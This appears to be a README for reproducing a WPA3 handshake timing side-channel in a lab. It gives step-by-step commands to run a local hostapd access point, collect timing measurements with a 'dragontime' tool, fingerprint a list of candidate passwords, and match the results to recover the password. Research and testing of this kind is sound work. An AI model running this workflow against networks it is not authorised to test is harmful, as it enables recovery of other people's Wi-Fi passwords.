Before starting, run:
```
sudo sh setup.sh
```

Choose your password and put it inside hostapd_wpa3.conf. 

Now, to start the AP, run:

```
sudo ./hostapd hostapd_wpa3.conf -dd -K
```

And to start taking measurements, run:
```
sudo ./dragontime -d wlan2 -a 00:11:00:00:00:00 -o measurements/PASSWORD.txt
```
Replace "PASSWORD" with your chosen filename. 

After getting 50-100 measurements, stop dragontime with CTRL+C.

To generate fingerprints for passwords, run:
```
./fingerprint passwords.txt out.csv
```
When passwords.txt is a file containing passwords, each in their own line, and the result will be saved to out.csv. 

After getting measurements and fingerprints, run:
```
python find_matches.py measurements/PASSWORD.txt out.csv
```
